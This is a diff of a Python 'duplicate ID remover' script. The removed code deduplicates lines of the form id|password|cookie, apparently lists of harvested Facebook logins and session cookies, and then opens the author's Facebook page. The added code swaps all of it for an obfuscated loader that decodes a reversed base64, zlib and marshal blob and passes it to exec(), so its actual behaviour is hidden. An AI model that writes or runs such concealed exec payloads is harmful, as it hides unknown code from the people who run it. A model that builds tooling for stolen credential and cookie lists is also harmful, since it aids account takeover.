@@ -1,34 +1,6 @@
-#coded by ruhul xmin
-#https://github.com/ruhulxmin
-from os import system as clr
-clr('clear')
-
-print('\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗')
-print('\33[1;92m║➣\033[1;91m DEVOLPER      : Ruhul Xmin\33[1;92m               ')
-print('\33[1;92m║➣ FACEBOOK      : Ruhul Xmin BokXi    \33[1;92m                  ')
-print('\33[1;92m║➣\033[1;34m GITHUB        : ruhulxmin               \33[1;92m           ')
-print('\33[1;92m║➣\033[1;35m TOOLS         : DUPLICATE ID REMOVER \33[1;92m                  ')
-print('\33[1;92m║➣\033[1;35m VERSION       : V1.0  \33[1;92m                  ')
-print('\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝')
-input_file = input("INPUT FILE NAME : ")
-output_file = input("OUTPUT FILE NAME : ")
-unique_ids = {}
-with open(input_file, 'r') as infile:
-    for line in infile:
-        line = line.strip()
-        values = line.split('|')
-        if len(values) == 3:
-            id, pas, coki = values
-            key = f"{id}|{pas}|{coki}"
-            if key not in unique_ids:
-                unique_ids[key] = line
-        else:
-            id, pas = values
-            key = f"{id}|{pas}"
-            if key not in unique_ids:
-                unique_ids[key] = line
-with open(output_file, 'w') as outfile:
-    for line in unique_ids.values():
-        outfile.write(line + '\n')
-print(f"DUPLICATE REMOVED FILE SAVED AS: {output_file}")
-import os; import time; os.system('xdg-open https://facebook.com/ruhul.xmin'); time.sleep(1)
+# Obfuscated with PyObfuscate
+# https://www.github.com/ruhulxmin
+# Time : Tue Jan  9 01:13:30 2024
+#Learn and code by your self 🥱
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=cU8Fn5vlH4MRl+jBwgGPCFNI4pNVhgG/x0Jgrcc9XUPe4uGd+vEi/5MWH76ypX3/tUkLksPO/jz+8ENpwD1kOvYT0OCy+nJSl9eW5wLapAWy0PA/G0LQjIeWgR947LB1akgcpjO4p1ETbQovWhUxTDSXbPFGFsog3WBbnpLcHdOVndlE3rj9764z+AnK4qgBc10S2nOmkN12n929ne2FUOfkAIV3S0i0hoyWlTCFjWwape6t1GbPxkGGybVLRs1Cb9IFKiGRKPuD7bV+ssuXWHL2tiqjtcrNdWrOuafLnVKfcbIg/JHS4eVDL7oL2JUTnX19RJej4aCOs3KSgKlOyinf1mbF1qgt02TttsBXdwlnXh9vsKbjW0w1Gu6oLv3P8ede2wFEKLt8+7J/dTfDLbDU0UU0XnApOrsrV+oJitCeH9KaXURqw+WCYp0M4Q7TC2q+mqL6X8OaIhIuXvywGl3J7g9K+IusEzV2547+ZFAWJgVEgEQ7IaARRAqEWFcOwMwjADSMLyNAvz0AQbwtAzifBw7IUAhSIcEZhRKVVmJKmcr8VIfsvE5LL+fg7ag0Zweoe1X9dtbGXBQqawQbvOQswHQMSVQEA1rDOI/IDQj2/ZaTH6iXSS8D18tnu4QTxGB9rE8vRdoMkkKjXukMl18I51mN7WYxMFd5g6VOKHa/KWzKVYOkDJ2iFqRQVejfypYsifxKh3UmvpJ0liA8JGGTLEfMO1dQJGj5Gumcsr/JMHWd19lysFFG6TNMPtaxaFXpOh5Fm1EmXpOVUajVoQ++2qJkhsUeUnq6X49vHV7rX7xjbSirzZm1QXUzuW84DuZUl9sXDjSUkc33y9idwkwckT/Yh2Rq6fj1Q2yb/mmC3WhIKFmp8Nw9yST9KSFH4OzwcXegg/AnYopgFhPzkjlhNXqx7q82gUtQ86hjLfR1A97860e6dBv7O1gGX4uXs4v1P2uE7sAwTGw5zc/GD2GwgO+EzN+/5UPYSoTMsBDjfCn6K05S5w2apsotri0gtRs8+oC/e2GZwZe3bdRqvQ5M9JVVZ+mcK5MFAi94BDSAHd4ZyMT9nN32StzjFrPxNdML65ufmDgth2z4cBOcCBufYcc9aR0/958qXdH8ugn3iL//c7anXbv5zfW57nD17yWGpC3pP7QaoTFFbBTNzsxokU01twzOJYEPDIeffVajOHyqW3uc3bjCv9BI6pzpChY7UUceBqfPhIycJ+kI+/yKNe3233VQe9Kikt628WcZXM6zO4M/2vpTPicZMgzyJzMRZJqEzFBQwiIqXEyWgByeNo5CDETPtm2HiTBGa/1K1wj98ZVQuvFV8ZYNI3EiILNSfimk5iQirTDHytNN50R27z4QqhRxFBxC9dG+hcvnubaPXtyfgW9eGv273n9xld6Vndp3B38w/QaQbzmsqIx8tyhijMLERi7NKvOED49XRjRjhFTExTjD1etNgmRLqlzGAK61eRWoqbTFRtauQrooXzFKhTpNM3GEfIgI8QkJDhEAIZETgYMRAMc6AMFdcl52l5q4F1Oeceuuz/57s/mf619l2+JuNgQHuGtxHg9qu169V1P8Itys/hU1py2X4vpVnEpmoT0VMRDIRVItriUiSTAyfdy1ZH+R7g2oluxqCEqlRCBtGQjWJD0UtwWhoKYZJkESIBfjb7PUY12P1dVFzJe'))
